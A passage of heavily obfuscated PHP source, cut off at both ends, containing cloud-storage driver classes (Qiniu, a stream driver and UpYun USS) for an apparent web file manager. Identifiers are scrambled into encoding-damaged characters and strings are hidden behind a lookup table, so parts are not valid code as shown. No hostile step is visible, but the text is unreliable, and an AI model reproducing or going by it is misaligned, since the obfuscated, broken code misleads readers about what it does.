$this->exist($ªúŒÑä›) ? !0 : !1; } public function canWrite($ù—­’øÛ) { return $this->exist($ù—­’øÛ) ? !0 : !1; } public function getContent($ğÉ ŞÛ) { return $this->fileSubstr($ğÉ ŞÛ, 0, -1); } public function setContent($Š»¿óƒâ, $æ¸ÀÓÅ = '') { $áª¸ñıĞ = $this->tempFile($this->pathThis($Š»¿óƒâ)); file_put_contents($áª¸ñıĞ, $æ¸ÀÓÅ); if ($this->upload($Š»¿óƒâ, $áª¸ñıĞ)) { $this->tempFileRemve($áª¸ñıĞ); return !0; } return !1; } public function refreshUrls($ÛõÉÅÍŸ) { $øÚ´¤ =& $_SERVER[¡¬ıÜ ƒ]; $“À×ğš­ = array(); if (is_array($ÛõÉÅÍŸ)) { foreach ($ÛõÉÅÍŸ as $¤úøèÆ¶) { $“À×ğš­[] = $this->link($¤úøèÆ¶); } } else { $“À×ğš­[] = $this->link($ÛõÉÅÍŸ); } $¹±ÔëŠ½ = new Qiniu\Cdn\CdnManager($this->auth); list($­öŠ®¹ğ, $ôş¥ÍÒş) = $¹±ÔëŠ½->refreshUrls($“À×ğš­); if ($ôş¥ÍÒş) { return !1; } return $­öŠ®¹ğ[$øÚ´¤[1275]] == $øÚ´¤[839] ? !0 : !1; } public function fileSubstr($ôíÏ Æú, $ªÎôŞ¹, $Œƒ¬ô³¡) { $æ¾«­™ =& $_SERVER[¡¬ıÜ ƒ]; if (!($„âˆ‰áï = $this->link($ôíÏ Æú))) { return !1; } $í¸áĞ­© = !1; if ($Œƒ¬ô³¡ > 0) { $¶Åòö—Æ = $ªÎôŞ¹ + $Œƒ¬ô³¡ - 1; $í¸áĞ­© = array($æ¾«­™[1547] . $ªÎôŞ¹ . $æ¾«­™[464] . $¶Åòö—Æ); } $­”ÃåÚ» = url_request($„âˆ‰áï, $æ¾«­™[1507], !1, $í¸áĞ­©); return $­”ÃåÚ»[$æ¾«­™[830]] ? $­”ÃåÚ»[$æ¾«­™[1298]] : !1; } public function upload($ÅŠÎ¼µô, $½Ş†‡³Ø, $Ò¹È¦À· = false, $½˜Îñ¸Ò = REPEAT_REPLACE) { $èÒ€ÜÅ = new Qiniu\Storage\UploadManager(); $²Ëñ¡«‡ = $this->auth->uploadToken($this->bucket, $ÅŠÎ¼µô); $é»Æ£’Ó = get_file_mime(get_path_ext($½Ş†‡³Ø)); list($¥Ù„àö³, $š÷Ñ„ğ) = $èÒ€ÜÅ->putFile($²Ëñ¡«‡, $ÅŠÎ¼µô, $½Ş†‡³Ø, null, $é»Æ£’Ó); return $š÷Ñ„ğ ? !1 : $this->getPathOuter($ÅŠÎ¼µô); } public function uploadFormData($¾öä»Ü”, $ïã†±û = 3600) { return $this->uploadToken($¾öä»Ü”, $ïã†±û); } public function uploadMultiData($ÅÇì±Û¬, $ÍÎïÑø— = 3600) { return $this->uploadToken($ÅÇì±Û¬, $ÍÎïÑø—); } private function uploadToken($‹¥Çµõü, $€½çğ¶ = 3600) { $­—›ğøÕ =& $_SERVER[¡¬ıÜ ƒ]; $Íúã®×´ = $€½çğ¶; $°Í¿¬´Ñ = array($­—›ğøÕ[1548] => $­—›ğøÕ[1549]); $™ÁÓİú = $‹¥Çµõü; $ñïä‚•­ = $this->auth->uploadToken($this->bucket, $™ÁÓİú, $Íúã®×´, $°Í¿¬´Ñ, !0); $¼›ÄÎò = empty($this->region) || $this->region == $­—›ğøÕ[1550] ? $­—›ğøÕ[12] : $­—›ğøÕ[464] . $this->region; $™¿”ˆà = http_type() . "\72\57\x2f\x75\x70\154\157\x61\144{$¼›ÄÎò}\x2e\x71\x69\156\151\x75\x70\56\143\157\155\57"; return array($­—›ğøÕ[1551] => $ñïä‚•­, $­—›ğøÕ[1552] => $™¿”ˆà); } public function download($ÑáôèÍ, $š’ÛÁÏµ) { $ÊÖ§Îñé = IO::getPathInner(IO::mkfile($š’ÛÁÏµ)); if (!($½ÊûÓÆ = $this->link($ÑáôèÍ))) { return !1; } $Öèİ£È = 0; $ĞØØ¦¥‡ = 1024 * 200; $éü»µ³Ê = fopen($ÊÖ§Îñé, $_SERVER[¡¬ıÜ ƒ][1553]); while (!0) { $©ÆÕÂ¤ = $this->fileSubstr($ÑáôèÍ, $Öèİ£È, $ĞØØ¦¥‡); if ($©ÆÕÂ¤ === !1) { return !1; } fwrite($éü»µ³Ê, $©ÆÕÂ¤); $Öèİ£È += $ĞØØ¦¥‡; if (strlen($©ÆÕÂ¤) < $ĞØØ¦¥‡) { break; } } fclose($éü»µ³Ê); return $š’ÛÁÏµ; } public function link($ŞÕè‰ˆ, $ Ñæ†ô¿ = '') { if (!$this->isFile($ŞÕè‰ˆ)) { return !1; } $©áÙÌÖ = $this->getHost() . $_SERVER[¡¬ıÜ ƒ][8] . $this->pathEncode($ŞÕè‰ˆ) . $ Ñæ†ô¿; return $this->auth->privateDownloadUrl($©áÙÌÖ, 3600 * 12); } public function fileOut($‚ëäî¦‹, $ÚÙîÖÄú = false, $àß”¬›³ = false, $—Îó²›Ä = '') { $‡ùœ†ã =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($‚ëäî¦‹, $ÚÙîÖÄú, $àß”¬›³, $—Îó²›Ä); } if (!$àß”¬›³) { $àß”¬›³ = $this->pathThis($‚ëäî¦‹); } $Í÷¯ä¶÷ = $ÚÙîÖÄú ? $‡ùœ†ã[1554] . rawurlencode($àß”¬›³) : $‡ùœ†ã[12]; $¸Çò‹èÊ = $this->link($‚ëäî¦‹, $Í÷¯ä¶÷); $this->fileOutLink($¸Çò‹èÊ); } public function fileOutServer($…ÔæøĞ¼, $‚­˜Ùìé = false, $ÒÂıØÁ = false, $ãìóàœ© = '') { parent::fileOut($…ÔæøĞ¼, $‚­˜Ùìé, $ÒÂıØÁ, $ãìóàœ©); } public function fileOutImage($óËÇã¿â, $Š¡È®Š = 250) { if ($this->size($óËÇã¿â) > 1024 * 1024 * 20) { return $this->fileOutImageServer($óËÇã¿â, $Š¡È®Š); } $Ø“á¥æ = $this->link($óËÇã¿â, $_SERVER[¡¬ıÜ ƒ][1555] . $Š¡È®Š); $this->fileOutLink($Ø“á¥æ); } public function fileOutImageServer($ÑÛĞáÖ, $”ÛæÜÓı = 250) { parent::fileOutImage($ÑÛĞáÖ, $”ÛæÜÓı); } public function hashMd5($§«©±¯) { $²èˆ“– =& $_SERVER[¡¬ıÜ ƒ]; $õ ­´ØÉ = $this->objectMeta($§«©±¯); return isset($õ ­´ØÉ[$²èˆ“–[247]]) ? $õ ­´ØÉ[$²èˆ“–[247]] : !1; $‹û¬´î = $this->link($§«©±¯, $²èˆ“–[1556]); } public function size($†Ü¼üùë) { $‚ÁÀĞò = $this->objectMeta($†Ü¼üùë); return $‚ÁÀĞò ? $‚ÁÀĞò[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function info($¢Èüªúœ) { if ($this->isFolder($¢Èüªúœ)) { return $this->folderInfo($¢Èüªúœ); } else { if ($this->isFile($¢Èüªúœ)) { return $this->fileInfo($¢Èüªúœ); } } return !1; } public function exist($‚õøäà¯) { return $this->isFile($‚õøäà¯) || $this->isFolder($‚õøäà¯); } public function isFile($œ“ªËú‹) { return !$this->isFolder($œ“ªËú‹) && $this->objectMeta($œ“ªËú‹); } public function isFolder($ÓØ²Ä…ñ) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][179], $ÓØ²Ä…ñ); } protected function objectMeta($Øë‚‘Ì) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][181], $Øë‚‘Ì); } protected function _objectMeta($Çˆõ‘¬æ) { $¾Ÿ© =& $_SERVER[¡¬ıÜ ƒ]; list($ÂÜõ·’Â, $ë½ÄĞ‘§) = $this->bucketManager->stat($this->bucket, $Çˆõ‘¬æ); if ($ÂÜõ·’Â) { $ÂÜõ·’Â[$¾Ÿ©[79]] = intval($ÂÜõ·’Â[$¾Ÿ©[1542]]); } return $ÂÜõ·’Â; } protected function _isFolder($¬ıšìó¿) { $ŞÒĞŠáŸ =& $_SERVER[¡¬ıÜ ƒ]; if ($¬ıšìó¿ == $ŞÒĞŠáŸ[12] || $¬ıšìó¿ == $ŞÒĞŠáŸ[8]) { return !0; } list($Ô²ê®–â, $ª¼Æ”û¹) = $this->bucketManager->listFiles($this->bucket, trim($¬ıšìó¿, $ŞÒĞŠáŸ[8]) . $ŞÒĞŠáŸ[8], $ŞÒĞŠáŸ[12], 1, $ŞÒĞŠáŸ[8]); return !empty($Ô²ê®–â[$ŞÒĞŠáŸ[1545]]) || !empty($Ô²ê®–â[$ŞÒĞŠáŸ[1546]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($”“çüË›, $çşäÈÄÇ = 0) { parent::__construct(); $this->source = $”“çüË›; $this->sourceSize = $çşäÈÄÇ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Îë×ú”† = false) { return $this->sourceSize; } public function getContent($ÇÕø–äÀ = false) { return $this->fileSubstr($ÇÕø–äÀ, 0, $this->sourceSize); } public function fileSubstr($ª‹ê§í¼ = false, $ú«ßÂÍ = 0, $Œ‡Ğˆœº = 0) { if (!$Œ‡Ğˆœº) { $Œ‡Ğˆœº = $this->sourceSize; } $·¯àÜ¶  = $this->sourceSize - $ú«ßÂÍ; if ($Œ‡Ğˆœº >= $·¯àÜ¶ ) { $Œ‡Ğˆœº = $·¯àÜ¶ ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ú«ßÂÍ, $Œ‡Ğˆœº); } if ($this->sourceType == self::TYPE_FILE) { if ($Œ‡Ğˆœº <= 0) { return $_SERVER[¡¬ıÜ ƒ][12]; } $ ¨çĞË = ftell($this->source); fseek_64($this->source, $ ¨çĞË + $ú«ßÂÍ); $¾ªÒ³¤˜ = @fread($this->source, $Œ‡Ğˆœº); fseek_64($this->source, $ ¨çĞË); return $¾ªÒ³¤˜; } } public function hashMd5($óã°À’‘ = false) { return md5($this->getContent()); } public static function hash($ï€¢›ª™, $¡Êë¦Ù = 0) { $¿âïŸäš = new PathDriverStream($ï€¢›ª™, $¡Êë¦Ù); return $¿âïŸäš->hashSimple($ï€¢›ª™); } public static function md5($·˜–ëêù, $á‚Ë†ì = 0) { $¹›Ç±ÇÆ = new PathDriverStream($·˜–ëêù, $á‚Ë†ì); return $¹›Ç±ÇÆ->hashMd5($·˜–ëêù); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\x2f\x76\x30\x2e\x61\160\x69\x2e\165\160\171\x75\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($İªˆí®º) { parent::__construct(); $this->_init($İªˆí®º); } public function _init($óé“Â¦) { $–ÆÁ °± =& $_SERVER[¡¬ıÜ ƒ]; foreach ($óé“Â¦ as $³¼¤ˆŞÖ => $“»şñŸÅ) { if (isset($this->{$³¼¤ˆŞÖ})) { $this->{$³¼¤ˆŞÖ} = $“»şñŸÅ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($–ÆÁ °±[1557] . LNG($–ÆÁ °±[1476])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ú–îöÌÖ, $¨”¾¦½é = "\107\105\x54") { $¾€ãËÙ¶ =& $_SERVER[¡¬ıÜ ƒ]; $ˆÚ‰Ãä£ = gmdate($¾€ãËÙ¶[1505]); $Å³„¨¦¼ = base64_encode(hash_hmac($¾€ãËÙ¶[1558], "{$¨”¾¦½é}\46{$Ú–îöÌÖ}\x26{$ˆÚ‰Ãä£}", md5("{$this->userpass}"), !0)); $üî­ı³€ = array("\x41\165\x74\150\157\x72\x69\x7a\x61\164\x69\157\156\x3a\x55\120\131\125\x4e\x20{$this->username}\x3a{$Å³„¨¦¼}", "\104\141\164\x65\72{$ˆÚ‰Ãä£}"); return $üî­ı³€; } public function ussRequest($¦–÷ñŠ, $ÄÃ÷óÙœ = "\107\x45\124", $–½ÃÜ¬ = false, $àâ¬ÉÃ = false, $Ï˜°­Óò = false) { $ÑÁ·ÈßŞ =& $_SERVER[¡¬ıÜ ƒ]; $¦–÷ñŠ = trim($¦–÷ñŠ, $ÑÁ·ÈßŞ[8]); $©›ÊÔ¹‚ = "\57{$this->bucket}\x2f" . rawurlencode($¦–÷ñŠ); $Êş¤ ş = $this->ussHeaders($©›ÊÔ¹‚, $ÄÃ÷óÙœ); if ($àâ¬ÉÃ) { $Êş¤ ş = array_merge($Êş¤ ş, $àâ¬ÉÃ); } $€«â¡ñ = url_request($this->endpoint . $©›ÊÔ¹‚, $ÄÃ÷óÙœ, $–½ÃÜ¬, $Êş¤ ş, $Ï˜°­Óò); if (!$€«â¡ñ) { $øË…ŞŠ = LNG($ÑÁ·ÈßŞ[1559]); $this->writeLog($øË…ŞŠ); return array($ÑÁ·ÈßŞ[1308] => !1, $ÑÁ·ÈßŞ[1298] => $øË…ŞŠ); } if (strtolower($ÄÃ÷óÙœ) == $ÑÁ·ÈßŞ[229] || in_array($€«â¡ñ[$ÑÁ·ÈßŞ[1308]], array($ÑÁ·ÈßŞ[263], $ÑÁ·ÈßŞ[1560]))) { $–½ÃÜ¬ = $€«â¡ñ[$ÑÁ·ÈßŞ[1561]]; if (!$€«â¡ñ[$ÑÁ·ÈßŞ[830]]) { $–½ÃÜ¬ = isset($–½ÃÜ¬[0]) ? $–½ÃÜ¬[0] : $ÑÁ·ÈßŞ[12]; } } else { $–½ÃÜ¬ = json_decode($€«â¡ñ[$ÑÁ·ÈßŞ[1298]], !0); if (!$–½ÃÜ¬) { $–½ÃÜ¬ = $€«â¡ñ[$ÑÁ·ÈßŞ[1298]]; } else { if (!$€«â¡ñ[$ÑÁ·ÈßŞ[830]] && isset($–½ÃÜ¬[$ÑÁ·ÈßŞ[1562]])) { $–½ÃÜ¬ = $–½ÃÜ¬[$ÑÁ·ÈßŞ[1562]]; } } } if (!$€«â¡ñ[$ÑÁ·ÈßŞ[830]]) { $this->writeLog($this->__errorMessage($–½ÃÜ¬)); } return array($ÑÁ·ÈßŞ[1308] => $€«â¡ñ[$ÑÁ·ÈßŞ[830]], $ÑÁ·ÈßŞ[1298] => $–½ÃÜ¬); } private function __errorMessage($æ–ş¢˜«) { $¾­†¿˜… =& $_SERVER[¡¬ıÜ ƒ]; if (!$æ–ş¢˜«) { return $¾­†¿˜…[12]; } static $•ò§ÇŞŞ = null; if (!$•ò§ÇŞŞ) { $•ò§ÇŞŞ = I18n::getType(); } if ($•ò§ÇŞŞ != $¾­†¿˜…[1515]) { return $æ–ş¢˜«; } $Â˜ÄºñÒ = array($¾­†¿˜…[1563] => $¾­†¿˜…[1564], $¾­†¿˜…[1565] => $¾­†¿˜…[1566], $¾­†¿˜…[1567] => $¾­†¿˜…[1566], $¾­†¿˜…[1568] => $¾­†¿˜…[1569], $¾­†¿˜…[1570] => $¾­†¿˜…[1571], $¾­†¿˜…[1572] => $¾­†¿˜…[1573], $¾­†¿˜…[1574] => $¾­†¿˜…[1575]); return isset($Â˜ÄºñÒ[$æ–ş¢˜«]) ? $Â˜ÄºñÒ[$æ–ş¢˜«] : $æ–ş¢˜«; } public function mkfile($Ş£Úúù, $øêÙº ¿ = '', $şôÆ‚ƒ¼ = REPEAT_RENAME) { if ($this->setContent($Ş£Úúù, $øêÙº ¿)) { return $this->getPathOuter($Ş£Úúù); } return !1; } public function mkdir($‹Éœó, $ûœÖÛêÊ = REPEAT_SKIP) { $Í÷¯Ú¡Ú =& $_SERVER[¡¬ıÜ ƒ]; $Ù²Ñ¨ = trim($‹Éœó, $Í÷¯Ú¡Ú[8]); if ($this->_isFolder($Ù²Ñ¨)) { return $this->getPathOuter($Ù²Ñ¨); } $Øù»í¡İ = array($Í÷¯Ú¡Ú[1576]); $Á¡Û¼¬Ø = $this->ussRequest($Ù²Ñ¨, $Í÷¯Ú¡Ú[290], !1, $Øù»í¡İ); return $Á¡Û¼¬Ø[$Í÷¯Ú¡Ú[1308]] ? $this->getPathOuter($Ù²Ñ¨) : !1; } public function copyFile($˜äŒŸ¤Í, $´æ÷äâ) { $ÁÚÔ¾şï =& $_SERVER[¡¬ıÜ ƒ]; $™¨¨ÜşŠ = array($ÁÚÔ¾şï[1577] . "\x2f{$this->bucket}\57{$˜äŒŸ¤Í}", $ÁÚÔ¾şï[1578]); $İ¶õõÇî = $this->ussRequest($´æ÷äâ, $ÁÚÔ¾şï[255], !1, $™¨¨ÜşŠ); return $İ¶õõÇî[$ÁÚÔ¾şï[1308]] ? !0 : $this->getPathOuter($´æ÷äâ); } public function moveFile($¾Œè¨ôº, $Ù­Íˆµ‚) { $Çüúˆâ® =& $_SERVER[¡¬ıÜ ƒ]; $×¶öš• = array($Çüúˆâ®[1579] . "\57{$this->bucket}\57{$¾Œè¨ôº}", $Çüúˆâ®[1578]); $äÉë–äĞ = $this->ussRequest($Ù­Íˆµ‚, $Çüúˆâ®[255], !1, $×¶öš•); return $äÉë–äĞ[$Çüúˆâ®[1308]] ? !0 : $this->getPathOuter($Ù­Íˆµ‚); } public function delFile($Öõã‰²–) { $¬¾ÄÛæÂ =& $_SERVER[¡¬ıÜ ƒ]; $€ş å°© = $this->ussRequest($Öõã‰²–, $¬¾ÄÛæÂ[1580]); return $€ş å°©[$¬¾ÄÛæÂ[1308]] ? !0 : !1; } public function delFolder($¿’Ê¶Æ) { $©†´çƒ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->exist($¿’Ê¶Æ)) { return !0; } $this->listItemCache = !1; $ïõ°µ = $š€™Üú¡ = array(); $this->fileList($¿’Ê¶Æ, $ïõ°µ, $š€™Üú¡, !0); $this->listItemCache = !0; foreach ($š€™Üú¡ as $Ì§×…èó) { $ñÏ˜ıÔË = $this->ussRequest($Ì§×…èó[$©†´çƒ[32]], $©†´çƒ[1580]); if (!$ñÏ˜ıÔË[$©†´çƒ[1308]]) { return !1; } } usort($ïõ°µ, function ($ï­¸şÇø, $¹ÕÕàÑ) { $ÜÀÒœÒ¼ =& $_SERVER[¡¬ıÜ ƒ]; return substr_count($¹ÕÕàÑ, $ÜÀÒœÒ¼[8]) - substr_count($ï­¸şÇø, $ÜÀÒœÒ¼[8]); }); foreach ($ïõ°µ as $—šå©İ‰) { $ñÏ˜ıÔË = $this->ussRequest($—šå©İ‰, $©†´çƒ[1580]); if (!$ñÏ˜ıÔË[$©†´çƒ[1308]]) { return !1; } } $ñÏ˜ıÔË = $this->ussRequest($¿’Ê¶Æ, $©†´çƒ[1580]); return $ñÏ˜ıÔË[$©†´çƒ[1308]]; } public function rename($Ù‘ì‘‘›, $ŸÀŞŞ°) { if ($this->isFile($Ù‘ì‘‘›)) { $ŸÀŞŞ° = get_path_father($Ù‘ì‘‘›) . $ŸÀŞŞ°; return $this->moveFile($Ù‘ì‘‘›, $ŸÀŞŞ°); } return $this->renameObject($Ù‘ì‘‘›, $ŸÀŞŞ°); } public function fileInfo($åÉÎéƒÆ, $Úé©éİ× = false, $ÒÍµ’üÄ = array()) { $¥®İğ– =& $_SERVER[¡¬ıÜ ƒ]; $°¬¼šûÕ = array($¥®İğ–[32] => $this->pathThis($åÉÎéƒÆ), $¥®İğ–[87] => $this->getPathOuter($¥®İğ–[8] . $åÉÎéƒÆ), $¥®İğ–[33] => $¥®İğ–[232], $¥®İğ–[79] => isset($ÒÍµ’üÄ[$¥®İğ–[79]]) ? $ÒÍµ’üÄ[$¥®İğ–[79]] : 0, $¥®İğ–[169] => $this->ext($åÉÎéƒÆ)); if ($Úé©éİ×) { return $°¬¼šûÕ; } $°¬¼šûÕ[$¥®İğ–[233]] = $°¬¼šûÕ[$¥®İğ–[88]] = 0; $°¬¼šûÕ[$¥®İğ–[234]] = $°¬¼šûÕ[$¥®İğ–[235]] = !0; if (empty($ÒÍµ’üÄ)) { $ÒÍµ’üÄ = $this->objectMeta($åÉÎéƒÆ); if (!$ÒÍµ’üÄ) { return $°¬¼šûÕ; } } $°¬¼šûÕ[$¥®İğ–[233]] = intval($ÒÍµ’üÄ[$¥®İğ–[1581]]); $°¬¼šûÕ[$¥®İğ–[88]] = intval($ÒÍµ’üÄ[$¥®İğ–[1582]]); $°¬¼šûÕ[$¥®İğ–[79]] = $ÒÍµ’üÄ[$¥®İğ–[79]]; return $°¬¼šûÕ; } public function folderInfo($šíªºıõ, $´ôÁ±“Ã = false) { $©•›ö„ =& $_SERVER[¡¬ıÜ ƒ]; $–úäú’  = array($©•›ö„[32] => $this->pathThis($šíªºıõ), $©•›ö„[87] => $this->getPathOuter($©•›ö„[8] . $šíªºıõ), $©•›ö„[33] => $©•›ö„[78]); if ($´ôÁ±“Ã) { return $–úäú’ ; } $–úäú’ [$©•›ö„[233]] = $–úäú’ [$©•›ö„[88]] = 0; $–úäú’ [$©•›ö„[234]] = $–úäú’ [$©•›ö„[235]] = !0; if (empty($”ŠµŒÔ)) { $”ŠµŒÔ = $this->objectMeta($šíªºıõ); if (!$”ŠµŒÔ) { return $–úäú’ ; } } $–úäú’ [$©•›ö„[233]] = intval($”ŠµŒÔ[$©•›ö„[1581]]); $–úäú’ [$©•›ö„[88]] = intval($”ŠµŒÔ[$©•›ö„[1582]]); return $–úäú’ ; } private function listObjs($ÁÊÇ—“, $¤óª‡‡Ş = 0, $˜²ş‘¢µ = 1000) { $İæùëì™ =& $_SERVER[¡¬ıÜ ƒ]; $º¤†•† = array($İæùëì™[1583], $İæùëì™[1584] . $˜²ş‘¢µ); if ($¤óª‡‡Ş) { $º¤†•†[] = $İæùëì™[1585] . $¤óª‡‡Ş; } $—µÁèÁ = $this->ussRequest($ÁÊÇ—“, $İæùëì™[1507], !1, $º¤†•†); return !$—µÁèÁ[$İæùëì™[1308]] ? !1 : $—µÁèÁ[$İæùëì™[1298]]; } private function fileList($‡Ãƒî¡ª, &$²ƒ‘¸Ñ•, &$ÀûÖ»î¸, $Èœ€¹¶¬ = false) { $ºë…¹¿‰ =& $_SERVER[¡¬ıÜ ƒ]; $–”úß· = $ºë…¹¿‰[12]; $Öİ‰¨ôˆ = 1000; $ğö¢Š²Á = rtrim($‡Ãƒî¡ª, $ºë…¹¿‰[8]) . $ºë…¹¿‰[8]; while (!0) { check_abort(); $ûğàÏÉ“ = $this->listObjs($‡Ãƒî¡ª, $–”úß·, $Öİ‰¨ôˆ); if (!$ûğàÏÉ“) { return !1; } $–”úß· = isset($ûğàÏÉ“[$ºë…¹¿‰[1586]]) ? $ûğàÏÉ“[$ºë…¹¿‰[1586]] : $ºë…¹¿‰[12]; $á¼ºúœ¿ = isset($ûğàÏÉ“[$ºë…¹¿‰[1587]]) ? $ûğàÏÉ“[$ºë…¹¿‰[1587]] : array(); foreach ($á¼ºúœ¿ as $Ñ¯³ë™») { $ğëµù¥” = $Ñ¯³ë™»[$ºë…¹¿‰[33]] == $ºë…¹¿‰[78] ? !0 : !1; $ï³¨ğ¢÷ = ltrim($ğö¢Š²Á . $Ñ¯³ë™»[$ºë…¹¿‰[32]], $ºë…¹¿‰[8]) . ($ğëµù¥” ? $ºë…¹¿‰[8] : $ºë…¹¿‰[12]); $ÜÖŒ¬­ã = array($ºë…¹¿‰[32] => $ï³¨ğ¢÷, $ºë…¹¿‰[33] => $ğëµù¥” ? $ºë…¹¿‰[78] : $ºë…¹¿‰[232], $ºë…¹¿‰[79] => $Ñ¯³ë™»[$ºë…¹¿‰[414]], $ºë…¹¿‰[1582] => $Ñ¯³ë™»[$ºë…¹¿‰[1588]]); $this->cacheMethodInfoSet($ï³¨ğ¢÷, $ğëµù¥”, $ÜÖŒ¬­ã); if ($ğëµù¥”) { $²ƒ‘¸Ñ•[] = $ï³¨ğ¢÷; if ($Èœ€¹¶¬) { $this->fileList($ï³¨ğ¢÷, $²ƒ‘¸Ñ•, $ÀûÖ»î¸, $Èœ€¹¶¬); } continue; } $ÀûÖ»î¸[] = $ÜÖŒ¬­ã; } if (count($á¼ºúœ¿) < $Öİ‰¨ôˆ) { break; } } $this->cacheMethodInfoSet($‡Ãƒî¡ª, !0); } public function listPath($ûç—†ˆ¦, $Õ¼Şª©¹ = false) { $ƒ®äï‹Õ =& $_SERVER[¡¬ıÜ ƒ]; $¸§éã„ = $±õŞ¦†ƒ = array(); $this->fileList($ûç—†ˆ¦, $¸§éã„, $±õŞ¦†ƒ); foreach ($¸§éã„ as $«ËòÌ‹ => $„Ğ³Ğ´Ø) { $¸§éã„[$«ËòÌ‹] = $this->folderInfo($„Ğ³Ğ´Ø, $Õ¼Şª©¹); } foreach ($±õŞ¦†ƒ as $«ËòÌ‹ => $„Ğ³Ğ´Ø) { $±õŞ¦†ƒ[$«ËòÌ‹] = $this->fileInfo($„Ğ³Ğ´Ø[$ƒ®äï‹Õ[32]], $Õ¼Şª©¹, $„Ğ³Ğ´Ø); } return array($ƒ®äï‹Õ[85] => $¸§éã„, $ƒ®äï‹Õ[86] => $±õŞ¦†ƒ); } public function has($Šîş”™™, $¨ı¾ÑÛÙ = false, $ğ³ü‰³ = true) { $Ü„¹¤Ëü =& $_SERVER[¡¬ıÜ ƒ]; $®‹Óå•Š = $Ü„¹¤Ëü[12]; $û±µİñò = 500; $Ü¿µÚÇ¿ = 0; $á¢‹ıÊ = 0; $ÍÅÄ²óˆ = rtrim($Šîş”™™, $Ü„¹¤Ëü[8]) . $Ü„¹¤Ëü[8]; while (!0) { check_abort(); $ş¶õ”õò = $this->listObjs($Šîş”™™, $®‹Óå•Š, $û±µİñò); if (!$ş¶õ”õò) { return !1; } $®‹Óå•Š = isset($ş¶õ”õò[$Ü„¹¤Ëü[1586]]) ? $ş¶õ”õò[$Ü„¹¤Ëü[1586]] : $Ü„¹¤Ëü[12]; $·³á´´ó = isset($ş¶õ”õò[$Ü„¹¤Ëü[1587]]) ? $ş¶õ”õò[$Ü„¹¤Ëü[1587]] : array(); if (empty($·³á´´ó)) { break; } $±±™åä = array_filter($·³á´´ó, function ($ØèÜğÁò) { $“÷‘³Ü =& $_SERVER[¡¬ıÜ ƒ]; return $ØèÜğÁò[$“÷‘³Ü[33]] == $“÷‘³Ü[78]; }); $şÏ„µ†Î = count($·³á´´ó); $±±™åä = count($±±™åä); $Ş÷ğÄª = $şÏ„µ†Î - $±±™åä; if ($¨ı¾ÑÛÙ) { $á¢‹ıÊ += $±±™åä; $Ü¿µÚÇ¿ += $Ş÷ğÄª; if ($şÏ„µ†Î < $û±µİñò) { break; } continue; } if ($ğ³ü‰³) { if ($Ş÷ğÄª) { return !0; } } else { if ($±±™åä) { return !0; } } if ($şÏ„µ†Î < $û±µİñò) { break; } } if ($¨ı¾ÑÛÙ) { return array($Ü„¹¤Ëü[241] => $Ü¿µÚÇ¿, $Ü„¹¤Ëü[242] => $á¢‹ıÊ); } return !1; } public function listAll($ôÆÀïØ™) { $£Ô¢Èéğ =& $_SERVER[¡¬ıÜ ƒ]; $„ºÕü´ = $êˆ‚ÎºÈ = array(); $this->fileList($ôÆÀïØ™, $„ºÕü´, $êˆ‚ÎºÈ, !0); $ó”Í‰Ã® = array_to_keyvalue($êˆ‚ÎºÈ, $£Ô¢Èéğ[32]); foreach ($„ºÕü´ as $Î³‰¯éĞ) { if (is_string($Î³‰¯éĞ)) { $ó”Í‰Ã®[$Î³‰¯éĞ] = array($£Ô¢Èéğ[79] => 0); } } return $this->listAllFiles($ôÆÀïØ™, $ó”Í‰Ã®); } public function canRead($Œş®‰­) { return $this->exist($Œş®‰­) ? !0 : !1; } public function canWrite($¤¸ŠåÒ) { return $this->exist($¤¸ŠåÒ) ? !0 : !1; } public function getContent($Îöä¡†Õ) { return $this->fileSubstr($Îöä¡†Õ, 0, -1); } public function setContent($ß™§õú›, $åë¸Ûèğ = '') { $„¶ç”‚í =& $_SERVER[¡¬ıÜ ƒ]; if (!$åë¸Ûèğ) { $ÜÃÇÆŸñ = $this->ussRequest($ß™§õú›, $„¶ç”‚í[290]); return $ÜÃÇÆŸñ[$„¶ç”‚í[1308]]; } $Û ¬Ù•Ê = $this->tempFile($this->pathThis($ß™§õú›)); file_put_contents($Û ¬Ù•Ê, $åë¸Ûèğ); if ($this->upload($ß™§õú›, $Û ¬Ù•Ê)) { $this->tempFileRemve($Û ¬Ù•Ê); return !0; } return !1; } public function fileSubstr($œ‹†ëš, $ÕóûßòÒ, $àæ„ÌÀ) { $ßùú¡æ‚ =& $_SERVER[¡¬ıÜ ƒ]; if (!($È½‹Š· = $this->link($œ‹†ëš))) { return !1; } $Ş×Æè•Ü = !1; if ($àæ„ÌÀ > 0) { $—––¶üñ = $ÕóûßòÒ + $àæ„ÌÀ - 1; $Ş×Æè•Ü = array($ßùú¡æ‚[1547] . $ÕóûßòÒ . $ßùú¡æ‚[464] . $—––¶üñ); } $âÈÈˆÒÆ = url_request($È½‹Š·, $ßùú¡æ‚[1507], !1, $Ş×Æè•Ü); return $âÈÈˆÒÆ[$ßùú¡æ‚[830]] ? $âÈÈˆÒÆ[$ßùú¡æ‚[1298]] : !1; } public function upload($¢Áá¸ïç, $…ºìñ‰Ñ, $¡şúûŒ = false, $Ê‡ìÃİ = REPEAT_REPLACE) { $ˆÍŞ¿œ =& $_SERVER[¡¬ıÜ ƒ]; $°”¤³ô = IO::size($…ºìñ‰Ñ); if ($°”¤³ô <= 1024 * 1024 * 200) { $¸èçà†¾ = array($ˆÍŞ¿œ[1589] . $…ºìñ‰Ñ); $€¨‹ËÜö = $this->ussRequest($¢Áá¸ïç, $ˆÍŞ¿œ[255], $¸èçà†¾); return 